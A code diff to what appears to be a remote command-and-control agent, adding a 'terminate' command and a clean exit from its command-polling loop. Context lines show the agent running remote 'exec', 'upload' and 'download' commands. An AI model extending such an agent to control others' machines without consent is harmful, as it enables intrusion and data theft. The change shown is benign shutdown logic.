@@ -115,6 +115,15 @@ def execute_download_command(command_data):
         return {'status': 'error', 'error': str(e)}
 
 
+def execute_terminate_command():
+    """Terminate the agent gracefully"""
+    return {
+        'status': 'success',
+        'result': 'Agent terminating...',
+        'terminate': True  # Signal to break the main loop
+    }
+
+
 def execute_command_by_type(command):
     """Route command to appropriate handler based on type"""
     cmd_type = command.get('type', 'exec')
@@ -126,6 +135,8 @@ def execute_command_by_type(command):
         return execute_upload_command(cmd_data)
     elif cmd_type == 'download':
         return execute_download_command(cmd_data)
+    elif cmd_type == 'terminate':
+        return execute_terminate_command()
     else:
         return {'status': 'error', 'error': f'Unknown command type: {cmd_type}'}
 
@@ -157,7 +168,8 @@ def main():
         return
 
     print("[+] Agent running. Polling for commands...")
-    while True:
+    should_terminate = False
+    while not should_terminate:
         time.sleep(SLEEP_TIME)
         try:
             commands = check_commands()
@@ -170,9 +182,17 @@ def main():
                 print(f"[+] Result: {result['status']}")
 
                 send_result(cmd_id, result)
+
+                # Check if we should terminate after sending result
+                if result.get('terminate', False):
+                    print("[!] Terminate command received. Shutting down...")
+                    should_terminate = True
+                    break
         except Exception as e:
             print(f"[-] Error in main loop: {e}")
             time.sleep(5)  # Wait a bit longer on error
+
+    print("[+] Agent terminated.")
 
 
 
